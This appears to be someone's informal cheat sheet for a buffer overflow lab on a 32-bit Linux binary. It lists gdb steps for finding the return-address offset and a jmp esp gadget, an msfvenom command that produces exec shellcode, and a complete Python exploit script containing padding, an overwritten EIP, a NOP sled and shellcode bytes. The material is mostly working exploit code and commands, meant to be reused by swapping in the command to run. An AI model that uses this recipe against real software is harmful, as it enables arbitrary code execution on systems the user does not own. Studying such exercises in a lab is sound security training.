ye

redirecting info as user input  ./func <<<$(echo "input")
input as a parameter            ./func $(echo "sample")



gdb ./func         (in the directory of func)
run
info functions    shows strings with addresses 
pdisass main
pdisass getuserinput
notice gets is red and vulnrable
run <<<$(python linbuff.py)                         go here if script needs more chars https://wiremask.eu/tools/buffer-overflow-pattern-generator/
put the eip from the output to the buffer website for offset
shell/exit
in shell do env - gdb ./func
from  (gdb)  show env
unset env Columns
unset env LINES
show env        should be denada
run then ctrl c
info proc map             look inbetween stack and heap
find /b 0xf7de1000, 0xffffe000, 0xff, 0xe4              f7de is from start addr right after heap ffff is from end addr on stack
coppy first 5 swap to little indian 
swap eip to little indian 
quit
somewhere 
msfvenom -p linux/x86/exec CMD=whoami -b '\x00' -f python exit          change cmd for what question is asking
add the buff lines under nop and +buf
./func <<<$(python linbuff.py)



scrip looks like
#!/usr/bin/env python
  
offset = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac"
eip = "\x59\x3b\xde\xf7"
nop = "\x90" * 15
buf =  b""
buf += b"\xb8\x25\x13\xaf\xbb\xdb\xc7\xd9\x74\x24\xf4\x5a"
buf += b"\x29\xc9\xb1\x0b\x31\x42\x14\x03\x42\x14\x83\xea"
buf += b"\xfc\xc7\xe6\xc5\xb0\x5f\x90\x48\xa1\x37\x8f\x0f"
buf += b"\xa4\x20\xa7\xe0\xc5\xc6\x38\x97\x06\x74\x50\x09"
buf += b"\xd0\x9b\xf0\x3d\xe5\x5b\xf5\xbd\x9d\x33\x9a\xdc"
buf += b"\x0c\xaa\x64\x48\x9c\xa5\x84\xbb\xa2"
print(offset+eip+nop+buf)


'''    (commeneted out)
0x f7 de 3b 59 --> "\x59\x3b\xde\xf7"
0xf7f588ab
0xf7f645fb
0xf7f6460f
0xf7f64aeb
msfvenom -p linux/x86/exec CMD=whoami -b '\x00' -f python exit
'''
